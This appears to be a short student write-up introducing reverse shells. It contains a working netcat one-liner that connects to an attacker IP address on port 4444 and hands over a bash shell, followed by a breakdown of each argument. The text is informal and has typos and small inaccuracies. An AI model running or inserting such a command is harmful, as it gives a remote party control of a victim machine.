**I did this in 20-30 minutes in class off the top of my head, as my previous changes didnt get pushed**

# What hacking is really like

In an age where technology runs just about everything, one might find themselves wondering how can someone sitting in their bedroom cause millions of dollar of damages or commit massive crippling attacks against government states. We're going to look at how an actual attack could work using a reverse shell.

# What is a reverse shell
A reverse shell is a peice of software written usually in common lanauges that runs on most machines, that sits and listens for commands from another machine across the internet. Its purpose to give remote access to a user, usually an attacker, to send commands directly to the host machines command line

```
nc 172.89.23.156 4444 -e /bin/bash
```

This is a basic reverse shell, using NetCat, what this effectivelty does is attempt to connect to a machine, in this case my attacking machine through the internet. IT attempts to connect to a listening serive on port ```4444``` and upon successful connection. MY attacking machine will have a shell open on the host machine awaiting whatever commands i may want to give.

# Dissecting the shell

```
nc $ip $port [arguments]
```
```nc``` is [NetCat](https://en.wikipedia.org/wiki/Netcat). Netcat is a tool built into many modern machines running today that allows the user to interact with the internet through the command line, in this case allowing me to forward a shell to my offensive machine.

```&ip``` Referse to the ip address your attacking machine is.

```$port``` Refers to the port your attacking machine is listening on.

```[arguments]``` Referse to possible arguments you can pass, such as in this case, the ```-e``` argument

The reason we pass ```-e /bin/bash``` into the ```[Arguments]``` block is becuase that is what makes all the magic of this reverse shell. We utilize the [*bash*](https://en.wikipedia.org/wiki/Bash_(Unix_shell)) shell by getting its path and feeding it to NEtCat via the ```-e``` argument. This forwards the a bash shell towards the offensive machine allowing it to utilize the victim machine's command line.
